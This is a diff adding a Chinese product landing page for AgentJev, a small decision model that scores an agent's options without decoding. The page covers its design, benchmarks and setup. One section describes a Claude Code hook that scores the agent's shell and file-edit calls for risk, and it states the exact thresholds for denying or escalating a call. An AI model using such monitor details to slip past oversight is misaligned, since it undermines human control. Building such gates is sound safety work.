@@ -1,0 +1,508 @@
+<a class="sr" href="#main">跳到正文</a>
+<header class="nav" id="nav">
+  <div class="wrap">
+    <a class="logo" href="#top" aria-label="AgentJev 首页">{{mark}}AGENT<b>JEV</b></a>
+    <nav class="nav-links" id="nav-links" aria-label="页面导航">
+      <a href="#demo">演示</a>
+      <a href="#how">原理</a>
+      <a href="#coding">编码门控</a>
+      <a href="#results">评测</a>
+      <a href="#hook">钩子</a>
+      <a href="#start">快速开始</a>
+      <a href="#guide">指南</a>
+    </nav>
+    <div class="nav-ext">
+      <a class="chip-link" href="https://github.com/malevrigns/agent-jev" target="_blank" rel="noopener">{{github_icon}}GitHub</a>
+      <a class="chip-link" href="https://huggingface.co/aimeigaoshou/agent-jev" target="_blank" rel="noopener"><span aria-hidden="true">🤗</span>权重</a>
+    </div>
+    <button class="menu-btn" id="menu-btn" type="button" aria-label="打开菜单" aria-expanded="false" aria-controls="nav-links"><span></span></button>
+  </div>
+  <div class="progress" id="progress"></div>
+</header>
+
+<main id="main">
+<section class="hero" id="top">
+  <div class="hero-bg" aria-hidden="true">
+    <div class="orb o1"></div><div class="orb o2"></div><div class="orb o3"></div>
+    <div class="grid"></div>
+    <svg class="beams" viewBox="0 0 1440 900" preserveAspectRatio="none">
+      <defs><linearGradient id="beam" x1="0" x2="1"><stop offset="0" stop-color="#d9b46c" stop-opacity="0"/><stop offset=".5" stop-color="#f4dba3"/><stop offset="1" stop-color="#d9b46c" stop-opacity="0"/></linearGradient></defs>
+      <path class="base" d="M-40 650 C 260 600, 420 380, 720 420 S 1180 300, 1480 210"/>
+      <path class="pulse" d="M-40 650 C 260 600, 420 380, 720 420 S 1180 300, 1480 210"/>
+      <path class="base" d="M-40 760 C 300 720, 520 560, 760 590 S 1200 470, 1480 420"/>
+      <path class="pulse" style="animation-delay:-2.6s;animation-duration:9s" d="M-40 760 C 300 720, 520 560, 760 590 S 1200 470, 1480 420"/>
+      <path class="base" d="M-40 300 C 240 330, 520 200, 800 250 S 1240 120, 1480 90"/>
+      <path class="pulse" style="animation-delay:-5s;animation-duration:11s" d="M-40 300 C 240 330, 520 200, 800 250 S 1240 120, 1480 90"/>
+    </svg>
+  </div>
+  <div class="wrap hero-layout">
+    <div class="hero-copy">
+      <a class="pill h-in" style="--d:0" href="#coding"><span class="new">NEW</span>coding-gates 权重：失败被判通过 {{v1_fp}} → {{gates_fp}}<span class="arrow">→</span></a>
+      <div class="eyebrow h-in" style="--d:120"><i></i>System One · 0.6B 决策模型</div>
+      <h1 class="display"><span class="line"><span style="--d:180">Agent 的</span></span><span class="line"><span class="grad" style="--d:300">反射弧</span></span></h1>
+      <p class="tagline h-in" style="--d:520">State in. A distribution out. Nothing decoded.</p>
+      <p class="lead h-in" style="--d:620">测试过了没有？下一步调哪个工具？这条命令能不能执行？把状态和写好的问题交给 AgentJev，<b>一次前向</b>就拿回每个选项的概率，<b>生成的 token 数是 0</b>。写代码、写回复，仍然交给大模型。</p>
+      <div class="ctas h-in" style="--d:740">
+        <a class="btn btn-primary" href="#start">五分钟跑起来</a>
+        <a class="btn btn-ghost" href="#demo"><span class="play-ico" aria-hidden="true"></span>看 {{video_seconds}} 秒演示</a>
+      </div>
+      <div class="metrics h-in" style="--d:860">
+        <div class="metric"><b>{{p50_after}}<small>ms</small></b><span>每案中位时延<br>1 段状态 · 5 道题</span></div>
+        <div class="metric"><b>0</b><span>生成 token<br>只做一次前向</span></div>
+        <div class="metric"><b>{{typed_top1}}<small>%</small></b><span>Typed Decisions<br>top-1 · 2,000 道</span></div>
+        <div class="metric"><b>{{gates_fp}}<small>/{{gates_neg}}</small></b><span>失败被判通过<br>编码门控 · 新权重</span></div>
+      </div>
+    </div>
+    <div class="h-in" style="--d:420">
+      <div class="console" id="console">
+        <div class="c-head">
+          <div class="dots" aria-hidden="true"><i></i><i></i><i></i></div>
+          <div class="seg" role="group" aria-label="示例" id="c-tabs"></div>
+          <span class="spacer"></span>
+          <span class="live"><i></i>实测回放</span>
+          <div class="seg" role="group" aria-label="权重" id="c-model">
+            <button type="button" data-model="gates" aria-pressed="true">新权重</button>
+            <button type="button" data-model="v1" aria-pressed="false">v1</button>
+          </div>
+        </div>
+        <div class="c-body">
+          <div class="c-state"><div class="c-col-h"><span>State</span><span id="c-src"></span></div><pre id="c-pre"></pre></div>
+          <div class="c-pass" aria-hidden="true">
+            <div class="c-col-h" style="margin:0">Qwen3</div>
+            <div class="layers" id="c-layers"></div>
+            <div class="pass-l">一次前向<b id="c-tok">—</b>token</div>
+            <div class="pass-l" style="margin-top:4px">生成</div>
+            <div class="zero">0</div>
+          </div>
+          <div class="c-dist" aria-live="polite"><div class="c-col-h"><span>Distribution</span><span id="c-qn"></span></div><div id="c-qs"></div><div class="verdict" id="c-verdict"></div></div>
+        </div>
+        <div class="c-foot" id="c-foot"></div>
+      </div>
+      <p class="c-note">回放的是 RTX 5060 上的真实请求与输出（已加载校准温度）；右上角可以切到 v1 对比。为了看清过程动画放慢了，底栏是这个请求的实测耗时。</p>
+    </div>
+  </div>
+</section>
+
+<section class="block nob" id="demo">
+  <div class="wrap">
+    <div class="sec-head center reveal">
+      <div class="idx">演示</div>
+      <h2 class="title">{{video_seconds}} 秒，看它在 Agent 循环里工作</h2>
+      <p class="desc">测试门控、编码门控的前后对比、Claude Code 钩子，还有它为什么快。画面里的每个数字都来自这台 RTX 5060 上的实测。</p>
+    </div>
+    <div class="video-shell reveal" style="--d:120">
+      <div class="video-inner">
+        <video id="video" playsinline preload="metadata" poster="media/agentjev-demo-poster.jpg" aria-label="AgentJev 演示视频"><source src="media/agentjev-demo.mp4" type="video/mp4"></video>
+        <button class="v-cover" id="v-cover" type="button" aria-label="播放演示视频"><span class="v-play"></span><span class="v-len">{{video_len}}</span></button>
+      </div>
+    </div>
+    <div class="chapters reveal" style="--d:200" id="chapters"></div>
+    <p class="video-note">无声，中英字幕已烧进画面。动画放慢了，耗时以画面上标注的实测值为准。也可以<a href="media/agentjev-demo.mp4" download>下载 MP4</a>（{{video_mb}} MB，1920×1080）。</p>
+  </div>
+</section>
+
+<section class="block" id="why">
+  <div class="wrap">
+    <div class="sec-head reveal">
+      <div class="idx">01 · 为什么</div>
+      <h2 class="title">大部分步骤，<br>不是写作题</h2>
+      <p class="desc">写代码的 Agent、分派工单的机器人、工作流引擎，大部分分叉只需要一个判断。常见做法是让 27B–70B 的模型把一个布尔值写成一段话，再去解析这段话。AgentJev 直接在你给定的选项上给出分布。</p>
+    </div>
+    <div class="duel">
+      <div class="card lane reveal" id="lane-writer">
+        <div class="lane-h"><span class="label">拿写作者当开关 · 示意</span><span class="cnt" id="w-cnt">0 token</span></div>
+        <p class="lane-q">“测试都通过了吗？请用 JSON 回答。”</p>
+        <div class="tokens" id="w-tokens" aria-hidden="true"></div>
+        <div class="lane-out" id="w-out"><span>逐个 token 解码，再从文本里解析出一个字符串。没有概率，格式也可能坏掉。</span></div>
+      </div>
+      <div class="card lane me reveal" style="--d:120" id="lane-jev">
+        <div class="lane-h"><span class="label gold">AgentJev · 实测</span><span class="cnt gold">0 token</span></div>
+        <p class="lane-q">“Have all tests passed?” · 上面 pytest 的那次失败</p>
+        <div class="jev-pulse" aria-hidden="true"><i></i></div>
+        <div id="jev-bars"></div>
+        <div class="lane-out"><span>一次前向，在你给的两个选项上直接给出分布。拿它和你自己的门槛比。</span></div>
+      </div>
+    </div>
+    <table class="vs reveal">
+      <thead><tr><th></th><th>拿写作者当开关</th><th>AgentJev</th></tr></thead>
+      <tbody>
+        <tr><td>输出</td><td>你希望它是 JSON 的文本</td><td>你给定选项上的分布</td></tr>
+        <tr><td>解码</td><td>一个 token 接一个 token</td><td>没有</td></tr>
+        <tr><td>失败方式</td><td>格式坏了，或者一句很确定的空话</td><td>一个可以设阈值的概率</td></tr>
+        <tr><td>在循环里的位置</td><td>占掉一整轮</td><td>写作者脚下的那一下反射</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section class="block" id="primitives">
+  <div class="wrap">
+    <div class="sec-head reveal">
+      <div class="idx">02 · 三种原语</div>
+      <h2 class="title">三种问法，<br>都返回完整分布</h2>
+      <p class="desc">下面三张卡片来自<b>同一个请求</b>：一段 Agent 运行轨迹，一次问了 {{trace_q}} 道题，{{trace_paths}} 条候选路径，服务端 {{trace_ms}} ms。题目的 id 只用来对应返回结果，意思要写进题目和选项正文里。</p>
+    </div>
+    <div class="trace-state reveal">
+      <span class="label">state</span>
+      <code id="trace-line"></code>
+    </div>
+    <div class="bento">
+      <div class="card card-pad prim reveal" data-prim="boolean">
+        <span class="kind">BOOLEAN</span>
+        <h3>一个命题</h3>
+        <p class="ask">“这条轨迹需要人工复核吗？”</p>
+        <div class="viz"><div class="vq" id="pb-q"></div><div class="split" id="pb-split"></div></div>
+        <p class="ret">你传入可选的 true / false 准则；拿回 <code>value</code>、P(true) 和两侧质量。</p>
+      </div>
+      <div class="card card-pad prim reveal" style="--d:100" data-prim="choice">
+        <span class="kind">CHOICE</span>
+        <h3>选哪一个</h3>
+        <p class="ask">“观测系统该怎么处理这条轨迹？”</p>
+        <div class="viz"><div class="vq" id="pc-q"></div><div id="pc-bars"></div><div class="qa-m" id="pc-m"></div></div>
+        <p class="ret">2–255 个选项，每项一段描述；拿回 <code>value</code>、<code>top_probability</code>、<code>margin</code> 和完整分布。</p>
+      </div>
+      <div class="card card-pad prim reveal" style="--d:200" data-prim="score">
+        <span class="kind">SCORE</span>
+        <h3>落在哪一级</h3>
+        <p class="ask">“这条轨迹里的行为风险多高？”</p>
+        <div class="viz"><div class="vq" id="ps-q"></div><div class="scale" id="ps-scale"></div><div class="qa-m" id="ps-m"></div></div>
+        <p class="ret">2–10 级有序描述，从低到高；拿回 <code>level</code> 和 <code>score</code> = Σ i·Pᵢ。</p>
+      </div>
+    </div>
+    <p class="callout reveal"><b>Choice 是给定集合内部的相对偏好，</b>不是某个动作独立的成功概率。需要后者，就对每个动作单独问一个 Boolean，再用你自己的结果数据校准。</p>
+  </div>
+</section>
+
+<section class="block" id="how">
+  <div class="wrap">
+    <div class="sec-head reveal">
+      <div class="idx">03 · 一次前向</div>
+      <h2 class="title">状态只读一次，<br>选项各走各的路</h2>
+      <p class="desc">骨干是去掉语言模型头的 Qwen3-0.6B，一个与排列等变的小头给整组候选打分，按题做 softmax。每个候选是一条独立的因果路径 <code>[状态][问题][候选]</code>；服务端把同一状态的路径合成一棵前缀树，一次前向编码完。每个 token 只关注自己和祖先，位置取它在原路径里的深度，所以候选读不到兄弟候选。</p>
+    </div>
+    <div class="how">
+      <div class="card tree-card reveal">
+        <div class="tree-top">
+          <div class="tree-count"><span id="tree-n">{{trie_paths_tokens}}</span> <span style="font-size:15px;color:var(--muted)">token</span><small id="tree-l">{{trace_paths}} 条独立路径</small></div>
+          <div class="seg" role="group" aria-label="编码方式" id="tree-seg">
+            <button type="button" data-view="paths" aria-pressed="true">逐条编码</button>
+            <button type="button" data-view="tree" aria-pressed="false">前缀树</button>
+          </div>
+        </div>
+        <div class="tree-stage" id="tree-stage" role="img" aria-label="{{trace_paths}} 条候选路径合并成一棵前缀树，骨干 token 从 {{trie_paths_tokens}} 降到 {{trie_tokens}}"></div>
+        <div class="legend"><span><i style="background:#a7813f"></i>状态</span><span><i style="background:rgba(147,180,255,.6)"></i>问题</span><span><i style="background:#f4dba3"></i>候选</span><span>块宽与真实 token 数成正比 · 横轴就是位置编码用的路径深度</span></div>
+      </div>
+      <div class="stats">
+        <div class="card stat reveal"><div class="k">每案骨干 token</div><div class="from">{{tok_before}}</div><div class="to" data-to="{{tok_after_raw}}">{{tok_after}}</div><span class="x">状态只读一次</span></div>
+        <div class="card stat reveal" style="--d:80"><div class="k">每案中位时延</div><div class="from">{{p50_before}} ms</div><div class="to">{{p50_after}}<small>ms</small></div><span class="x">{{p50_x}}× 更快</span></div>
+        <div class="card stat reveal" style="--d:160"><div class="k">吞吐（每请求 20 案）</div><div class="from">{{tp_before}} 案/秒</div><div class="to">{{tp_after}}<small>案/秒</small></div><span class="x">{{tp_x}}×</span></div>
+        <div class="card stat reveal" style="--d:240"><div class="k">常驻权重</div><div class="from">{{res_before}} MiB</div><div class="to">{{res_after}}<small>MiB</small></div><span class="x">BF16 存储 · 输出逐位相同</span></div>
+      </div>
+    </div>
+    <div class="facts">
+      <div class="card fact reveal"><div class="n">没有解码</div><h4>隐状态直接变成 logits</h4><p>没有输出词表这一步，也就没有待修补的 JSON。<code>generated_tokens</code> 永远是 0。</p></div>
+      <div class="card fact reveal" style="--d:80"><div class="n">2,048 tokens</div><h4>超长就拒绝，不截断</h4><p>装不下的 diff 或堆栈是一次明确的错误，不会悄悄切掉问题或某个候选。</p></div>
+      <div class="card fact reveal" style="--d:160"><div class="n">分布不变</div><h4>结果和逐条编码一致</h4><p>400 个测试案例上，2,000 道题有 1,998 道选中同一个选项，变了的两道原本就是平局；概率最大差 0.0053。</p></div>
+    </div>
+    <p class="fine">一块 RTX 5060（8 GB），{{gpu_env}}；400 个测试案例，每案一次请求，计时包含分词。运行间波动约 10%。Laya 没有在这块显卡上重测，这里不是和它的正面对比。</p>
+  </div>
+</section>
+
+<section class="block" id="coding">
+  <div class="wrap">
+    <div class="sec-head reveal">
+      <div class="idx">04 · 编码门控 · 新权重</div>
+      <h2 class="title">测试没过，<br>就不能说通过</h2>
+      <p class="desc">v1 从没在“读测试输出”这件事上被测过。我们录下 2,100 次真实测试运行：pytest、unittest、jest、mocha，另外把 vitest 和 node --test 整体留出不训练；每个项目的结果在构建时就已确定，标签从不从输出里反推。再加 1,800 条一行摘要。在测试集上，v1 把 {{gates_neg}} 个失败案例中的 {{v1_fp}} 个判成了通过。</p>
+    </div>
+    <div class="res-grid">
+      <div class="card card-pad wide reveal">
+        <div class="grid-head">
+          <div>
+            <div class="label">测试集的 {{gates_neg}} 个失败案例 · 每格一个案例，悬停看原文</div>
+            <div class="big-cmp"><span class="a">{{v1_fp}}</span><span class="arrow">→</span><span class="b" id="fp-now">{{v1_fp}}</span><span class="u">个被判成“已通过”</span></div>
+          </div>
+          <div class="seg" role="group" aria-label="权重" id="grid-seg">
+            <button type="button" data-model="v1" aria-pressed="true">v1</button>
+            <button type="button" data-model="gates" aria-pressed="false">新权重</button>
+          </div>
+        </div>
+        <div class="grid-pair">
+          <div><div class="small muted">完整运行 · {{runs_neg}} 个</div><div class="dots-grid" id="grid-runs"></div></div>
+          <div><div class="small muted">一行摘要 · {{sums_neg}} 个</div><div class="dots-grid" id="grid-sums"></div></div>
+        </div>
+        <div class="grid-key"><span><i style="background:var(--bad)"></i>被判成通过（错误放行）</span><span><i style="background:rgba(236,224,200,.12)"></i>判对：没通过</span></div>
+      </div>
+      <div class="card card-pad reveal">
+        <div class="label">没训练过的运行器 · vitest 与 node --test · {{ood_n}} 次运行</div>
+        <div class="dots-grid" id="grid-ood" style="margin-top:16px"></div>
+        <div class="grid-key"><span><i style="background:var(--bad)"></i>失败被判通过</span><span><i style="background:var(--warn)"></i>实际通过却被拦下</span><span><i style="background:rgba(134,212,164,.3)"></i>通过 · 判对</span></div>
+        <div class="kv" style="grid-template-columns:1fr 1fr">
+          <div><div class="k">失败被判通过</div><div class="v"><s>{{ood_fp_v1}}</s>{{ood_fp_g}}<small class="muted"> / {{ood_neg}}</small></div></div>
+          <div><div class="k">实际通过却被拦下</div><div class="v down"><s>{{ood_fb_v1}}</s>{{ood_fb_g}}<small class="muted"> / {{ood_pos}}</small></div></div>
+        </div>
+        <p class="fine">拦下的 {{ood_fb_g}} 个都是 node 的 <code>dot</code> 报告器：状态里没有退出码时，成功的运行只打印一排点。</p>
+      </div>
+      <div class="card card-pad reveal" style="--d:100">
+        <div class="label">README 的 HTTP 示例 · 真实服务</div>
+        <div class="example-cmp" style="grid-template-columns:1fr 1fr">
+          <div class="st">{{readme_state}}<br><span class="muted">“Are all tests passing?”</span></div>
+          <div class="mcard"><div class="who">v1</div><div class="p badv">{{readme_v1}}</div><div class="w">P(全部通过) · 判错了</div></div>
+          <div class="mcard"><div class="who gold">新权重</div><div class="p goodv">{{readme_g}}</div><div class="w">P(全部通过) · 判对了</div></div>
+        </div>
+        <div class="kv" style="grid-template-columns:1fr 1fr">
+          <div><div class="k">五种没训练过的问法 · 测试集门控</div><div class="v"><s>{{para_v1}}</s>{{para_g}}</div></div>
+          <div><div class="k">Typed Decisions 测试集 top-1</div><div class="v"><s>{{typed_v1}}</s>{{typed_g}}</div></div>
+        </div>
+        <p class="fine">Typed Decisions 提升 {{typed_diff}} 个百分点，按案例配对 bootstrap 的 95% CI 为 {{typed_ci}}。两者都走同一个推理引擎，温度只在校准集上拟合，每个留出集只读了一次。这里 v1 的 79.50% 是 BF16 发布文件经推理引擎的结果；评测表里的 79.25% 是 FP32 检查点的离线评分。</p>
+      </div>
+    </div>
+    <div class="callout warn reveal">
+      <b>还没解决的：</b>极简问法 “Tests passing?”（criteria 只有 yes / no）在测试集上 {{terse_g}}；node 的 <code>dot</code> 报告器会让它拦下实际通过的运行；Go 的 <code>? pkg [no test files]</code> 会被读成“没跑测试”。项目规模小、由程序生成，一行摘要来自模板，测试集和训练集共用模板。
+    </div>
+    <div class="variant reveal" style="margin-top:18px">
+      <div class="code" style="flex:1;min-width:280px"><div class="cap"><span class="fn">bash · 编码 Agent 推荐</span><button class="mini-btn" type="button" data-copy="python fetch_v1_weights.py --variant coding-gates">复制</button></div><pre>python fetch_v1_weights.py --variant coding-gates</pre></div>
+      <p>权重在 Hugging Face 的 <a href="https://huggingface.co/aimeigaoshou/agent-jev/tree/coding-gates" target="_blank" rel="noopener">coding-gates 分支</a>，只换了权重和温度，配置和分词器与 v1 相同。默认仍然是 v1。<a href="https://github.com/malevrigns/agent-jev/blob/main/coding_gates/README.md" target="_blank" rel="noopener">完整报告 →</a></p>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="results">
+  <div class="wrap">
+    <div class="res-grid" style="align-items:start">
+      <div class="sec-head reveal" style="margin:0">
+        <div class="idx">05 · 评测</div>
+        <h2 class="title">Typed Decisions<br>2,000 道决策</h2>
+        <p class="desc">官方测试集 400 个案例、每个案例 5 道题、四个工作流。准确率是和公开教师标签 argmax 的一致率，<b>不是</b>实测的 Agent 任务成功率。</p>
+        <p class="fine">对比 Laya 已发布的检查点，差距 +2.25 个百分点，按案例 bootstrap 的 95% 区间 [{{board_ci}}]。没有 soft CE 的行抄自数据集卡片，未在本仓库重新评分；专用模型和零样本的通用模型不是同一种测量。</p>
+      </div>
+      <div class="card card-pad reveal" style="--d:120">
+        <div class="label">Top-1 · 官方测试集</div>
+        <div class="board" id="board"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="hook">
+  <div class="wrap">
+    <div class="sec-head reveal">
+      <div class="idx">06 · Claude Code 钩子</div>
+      <h2 class="title">工具执行之前，<br>先过一道门</h2>
+      <p class="desc"><code>agentjev_hook.py</code> 是一个 PreToolUse 命令钩子。Claude Code 执行 Bash、Write、Edit 之前，它把这次调用发给本地服务，问一道 Boolean（安全吗）和一道四级 Score（风险多高）。它从不输出 <code>allow</code>，所以不会绕过你自己的权限设置；服务不响应时直接退出，调用照常走权限流程。</p>
+    </div>
+    <div class="hook">
+      <div class="reveal">
+        <div class="decisions">
+          <div class="dec"><span class="badge deny">deny</span><span>风险第 3 级<b>并且</b>判为不安全：只拦下这一次调用，把理由交给 Claude，Claude 可以换一步继续。</span></div>
+          <div class="dec"><span class="badge ask">ask</span><span>风险第 2 级及以上，或 P(安全) &lt; 0.5：弹窗请你确认。</span></div>
+          <div class="dec"><span class="badge none">不表态</span><span>其余情况什么都不输出，按你自己的权限设置走。</span></div>
+        </div>
+        <div class="code" style="margin-top:18px"><div class="cap"><span class="fn">.claude/settings.json</span><button class="mini-btn" type="button" data-copy-from="hook-json">复制</button></div><pre id="hook-json">{{hook_json}}</pre></div>
+        <p class="fine"><code>AGENTJEV_URL</code> 改服务地址（默认 <code>http://127.0.0.1:8149</code>），<code>AGENTJEV_ASK_LEVEL</code>、<code>AGENTJEV_ASK_BELOW</code> 调整询问门槛，<code>AGENTJEV_VERBOSE=1</code> 让不表态的调用也显示判定。</p>
+      </div>
+      <div class="feed reveal" style="--d:120" id="feed">
+        <div class="feed-h"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="t">PreToolUse · Bash · 新权重 · 真实钩子输出</span><span class="spacer"></span><button class="mini-btn" type="button" id="feed-replay">重放</button></div>
+        <div id="feed-rows"></div>
+        <div class="feed-foot" id="feed-foot"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="start">
+  <div class="wrap">
+    <div class="sec-head reveal">
+      <div class="idx">07 · 快速开始</div>
+      <h2 class="title">五分钟跑起来</h2>
+      <p class="desc">需要 Python 3.10+ 和一块 CUDA 显卡，权重常驻约 1.4 GB 显存；CPU 也能跑，但慢很多。服务只绑定 127.0.0.1。</p>
+    </div>
+    <div class="start">
+      <div>
+        <div class="variant reveal">
+          <div class="seg" role="group" aria-label="选择权重" id="var-seg">
+            <button type="button" data-v="v1" aria-pressed="true">v1 · 默认</button>
+            <button type="button" data-v="gates" aria-pressed="false">coding-gates · 编码 Agent</button>
+          </div>
+          <p id="var-note"></p>
+        </div>
+        <div class="steps">
+          <div class="step reveal">
+            <h3>克隆，装依赖</h3>
+            <p>先按 <a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">PyTorch 官方选择器</a>装好适合你硬件的 torch（RTX 50 系列选 CUDA 12.8 或更新的构建）。</p>
+            <div class="code"><div class="cap"><div class="tabs" role="tablist" data-tabs="install"><button type="button" role="tab" aria-selected="true" data-k="bash">bash</button><button type="button" role="tab" aria-selected="false" data-k="ps">PowerShell</button></div><button class="mini-btn" type="button" data-copy-from="code-install">复制</button></div><pre id="code-install"></pre></div>
+          </div>
+          <div class="step reveal">
+            <h3>拉取固定版本的权重</h3>
+            <p>只下载 7 个文件（权重、校准温度、配置和分词器），逐个核对大小和 SHA-256，约 1.2 GB。</p>
+            <div class="code"><div class="cap"><span class="fn">bash / PowerShell</span><button class="mini-btn" type="button" data-copy-from="code-fetch">复制</button></div><pre id="code-fetch"></pre></div>
+          </div>
+          <div class="step reveal">
+            <h3>启动服务</h3>
+            <p>先跑一次预热请求再报告就绪，第一个真实请求不用付 CUDA 初始化的约 1 秒。</p>
+            <div class="code"><div class="cap"><span class="fn">bash / PowerShell</span><button class="mini-btn" type="button" data-copy-from="code-serve">复制</button></div><pre id="code-serve"></pre></div>
+          </div>
+          <div class="step reveal">
+            <h3>问第一个问题</h3>
+            <p>同一状态的多道题放进一个请求，状态只编码一次。</p>
+            <div class="code"><div class="cap"><div class="tabs" role="tablist" data-tabs="ask"><button type="button" role="tab" aria-selected="true" data-k="curl">curl</button><button type="button" role="tab" aria-selected="false" data-k="ps">PowerShell</button><button type="button" role="tab" aria-selected="false" data-k="py">Python</button></div><button class="mini-btn" type="button" data-copy-from="code-ask">复制</button></div><pre id="code-ask"></pre></div>
+          </div>
+        </div>
+      </div>
+      <div class="term reveal" style="--d:120">
+        <div class="bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="t" id="term-title">agent-jev · 本机实录</span><span class="spacer"></span><button class="mini-btn" type="button" id="term-replay">重放</button></div>
+        <div class="term-body" id="term" aria-label="终端实录"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="guide">
+  <div class="wrap">
+    <div class="sec-head reveal">
+      <div class="idx">08 · 上手指南</div>
+      <h2 class="title">写请求，读分布</h2>
+      <p class="desc">在这里构造一个请求、看懂返回、把题目写好。全部在浏览器里完成，不连任何服务。</p>
+    </div>
+    <div class="gtabs reveal" role="tablist" id="gtabs">
+      <button type="button" role="tab" aria-selected="true" data-g="builder">构造请求</button>
+      <button type="button" role="tab" aria-selected="false" data-g="read">读懂返回</button>
+      <button type="button" role="tab" aria-selected="false" data-g="write">写好问题</button>
+      <button type="button" role="tab" aria-selected="false" data-g="batch">批量与性能</button>
+      <button type="button" role="tab" aria-selected="false" data-g="faq">排错</button>
+    </div>
+
+    <div class="gpanel on" id="g-builder" role="tabpanel">
+      <p>左边改状态和题目，右边实时生成请求体和各语言的调用代码，并按服务端的规则检查。“模型实际读到的文字”是一条候选路径拼出来的样子。</p>
+      <div class="builder">
+        <div class="panel" id="b-form">
+          <div class="field"><label for="b-state">state（文字，或 JSON 对象／数组）</label><textarea id="b-state" spellcheck="false"></textarea></div>
+          <div id="b-questions" style="display:flex;flex-direction:column;gap:10px"></div>
+          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px">
+            <button type="button" class="mini-btn" data-add="boolean">+ Boolean</button>
+            <button type="button" class="mini-btn" data-add="choice">+ Choice</button>
+            <button type="button" class="mini-btn" data-add="score">+ Score</button>
+            <button type="button" class="mini-btn" id="b-reset">恢复示例</button>
+          </div>
+        </div>
+        <div class="panel">
+          <div class="issues" id="b-issues" aria-live="polite"></div>
+          <div class="meter" id="b-meter"></div>
+          <div class="code"><div class="cap"><div class="tabs" role="tablist" id="b-tabs">
+            <button type="button" role="tab" aria-selected="true" data-out="json">JSON</button>
+            <button type="button" role="tab" aria-selected="false" data-out="curl">curl</button>
+            <button type="button" role="tab" aria-selected="false" data-out="ps">PowerShell</button>
+            <button type="button" role="tab" aria-selected="false" data-out="client">Python 客户端</button>
+          </div><button type="button" class="mini-btn" id="b-copy">复制</button></div>
+          <pre id="b-out" style="max-height:360px"></pre></div>
+          <div class="field" style="margin-top:14px"><span class="lbl">模型实际读到的文字（第 1 题，第 1 个候选）</span><div class="peek" id="b-peek"></div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="gpanel" id="g-read" role="tabpanel">
+      <p>每道题的答案都带完整分布。下面是一个 Boolean 门控在八段测试输出上的真实 P(true)。拖动门槛，看哪些会被放行；门槛放多高，取决于放错一次的代价：自动合并代码要严，提醒人工复核可以松。</p>
+      <div class="th">
+        <div class="th-head">
+          <label for="th" class="label">门槛 P(true) ≥</label>
+          <input type="range" id="th" min="0.05" max="0.95" step="0.01" value="0.5">
+          <output id="th-out" class="th-out" for="th">0.50</output>
+          <div class="seg" role="group" aria-label="权重" id="th-seg"><button type="button" data-model="gates" aria-pressed="true">新权重</button><button type="button" data-model="v1" aria-pressed="false">v1</button></div>
+          <span class="small muted" id="th-sum"></span>
+        </div>
+        <div id="th-rows"></div>
+      </div>
+      <p class="fine">问题 “Are all tests passing?”，criteria 与 README 的 HTTP 示例相同。状态是 <code>coding_gates/evaluate.py</code> 里的八条手写抽查，概率是两份权重经推理引擎的真实输出（已校准）。</p>
+      <div class="table-wrap" style="margin-top:18px"><table class="tbl">
+        <thead><tr><th>字段</th><th>出现在</th><th>怎么用</th></tr></thead>
+        <tbody>
+          <tr><td><code>distribution</code></td><td>全部</td><td>键是你传的选项 id（或下标），值相加为 1。永远先看它</td></tr>
+          <tr><td><code>probability</code> / <code>value</code></td><td>Boolean</td><td>P(true) 和按 0.5 切出的布尔值。生产里用你自己的门槛，不要只看 value</td></tr>
+          <tr><td><code>top_probability</code> / <code>margin</code></td><td>Choice</td><td>margin 小，说明模型拿不准，适合转交大模型或人工</td></tr>
+          <tr><td><code>score</code> / <code>level</code></td><td>Score</td><td>score 连续，适合排序和设阈值；level 是最可能的那一档</td></tr>
+          <tr><td><code>usage</code></td><td>每次请求</td><td><code>generated_tokens</code> 恒为 0；<code>backbone_input_tokens</code> 是骨干实际算的 token；<code>wall_ms</code> 是服务端耗时</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+
+    <div class="gpanel" id="g-write" role="tabpanel">
+      <p>AgentJev 只看得到文字。题目和选项写得越像一个清楚的判断，分布就越可信。</p>
+      <div class="dodont">
+        <div class="h no">别这样</div><div class="h yes">这样</div>
+        <div><code>"options": {"a": "A", "b": "B"}</code>，意思藏在 id 里</div><div>把意思写进描述：<code>"retry": "Rerun the suite without changing the code."</code></div>
+        <div>Boolean 只写一句模糊的问题</div><div>补上 <code>criteria</code>，说清楚 true 和 false 各指什么</div>
+        <div>Score 等级乱序，或者从高到低排</div><div>从低到高排，每档一句可区分的描述</div>
+        <div>把一段 3,000 token 的日志整段塞进 state</div><div>先截取相关片段；超过 2,048 token 会直接报错</div>
+        <div>用 Choice 的概率当“这个动作会成功的概率”</div><div>需要绝对概率时，每个动作单独问一个 Boolean，在你的数据上校准</div>
+        <div>同一状态的五道题分五次请求</div><div>放进同一个请求，状态只编码一次</div>
+        <div>测试门控只问一句极简的 “Tests passing?”</div><div>写清楚准则：至少跑了一个测试，并且全部通过</div>
+      </div>
+    </div>
+
+    <div class="gpanel" id="g-batch" role="tabpanel">
+      <p>测试集前 20 个案例，按实测耗时 1:1 回放。每格是一个案例（1 段状态 5 道题，一次请求），亮起的时刻就是它在本机实际完成的时刻。</p>
+      <div class="race">
+        <div class="grid-head"><span class="clock" id="race-clock">0 ms</span><button class="mini-btn" type="button" id="race-play">开跑</button></div>
+        <div class="race-row before"><span>共享前缀之前</span><div class="cells" id="race-before"></div><span class="race-v" id="race-before-v"></span></div>
+        <div class="race-row after"><span>现在</span><div class="cells" id="race-after"></div><span class="race-v" id="race-after-v"></span></div>
+      </div>
+      <ul class="plain">
+        <li>把同一状态的所有问题放进<b>一个请求</b>，才能共享状态编码。分开请求，每次都会把状态重算一遍。</li>
+        <li>一次请求最多 32 个状态、128 道题、1,024 条候选路径，请求体 1 B–1 MB。多个状态放在 <code>{"requests": [{"id", "state", "questions"}, …]}</code> 里，或用客户端的 <code>evaluate_many()</code>。</li>
+        <li>某个状态的前缀树太大（单次前向超过 8,192 个 token 或 64 MB 掩码）时，这个状态自动退回按问题共享的旧路径，结果不变。</li>
